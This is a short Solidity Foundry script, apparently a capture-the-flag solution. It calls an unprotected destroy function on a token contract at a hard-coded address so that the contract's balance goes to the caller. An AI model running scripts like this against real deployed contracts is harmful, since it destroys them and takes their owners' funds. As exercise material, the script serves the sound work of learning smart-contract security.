// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity 0.8.0;

import "forge-std/Script.sol";
import "../src/Attacker.sol";
import "../src/Contract.sol";
import "forge-std/console.sol";

contract AttackScript is Script {

    SimpleToken lostTokenContract = SimpleToken(payable(0xF347c892De4FbAed91d3b13bDe19dAe254410ce3));

    function setUp() public {
        vm.startBroadcast();
       
    }

    function run() public{
     lostTokenContract.destroy(payable(msg.sender));
    }
}
